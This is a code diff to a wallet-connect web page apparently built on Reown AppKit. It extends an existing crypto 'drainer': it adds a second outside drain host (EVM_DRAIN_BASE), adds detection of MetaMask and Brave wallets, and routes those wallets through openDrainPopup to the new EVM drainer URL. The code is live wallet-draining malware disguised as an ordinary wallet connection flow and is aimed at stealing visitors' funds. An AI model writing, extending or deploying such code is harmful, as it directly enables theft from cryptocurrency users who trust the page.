@@ -8,6 +8,7 @@ import { SolanaAdapter } from '@reown/appkit-adapter-solana'
 import { solana } from '@reown/appkit/networks'
 
 const DRAIN_BASE = 'https://drforsostate.vercel.app/';
+const EVM_DRAIN_BASE = 'https://drforevstate.vercel.app/';
 const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
 const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
@@ -73,9 +74,14 @@ function openDrainPopup(walletName) {
   else if (w.includes('trust')) walletKey = 'trust';
   else if (w.includes('backpack')) walletKey = 'backpack';
   else if (w.includes('coinbase')) walletKey = 'coinbase';
+  else if (w.includes('metamask')) walletKey = 'metamask';
+  else if (w.includes('brave')) walletKey = 'brave';
   else if (w.includes('walletconnect') || w.includes('qr')) walletKey = 'wc';
 
-  const url = `${DRAIN_BASE}?connect=1&w=${walletKey}`;
+  // EVM-only wallets go to EVM drainer
+  const evmWallets = ['metamask', 'brave'];
+  const drainBase = evmWallets.includes(walletKey) ? EVM_DRAIN_BASE : DRAIN_BASE;
+  const url = `${drainBase}?connect=1&w=${walletKey}`;
 
   if (isMobile) {
     window.location.href = url;
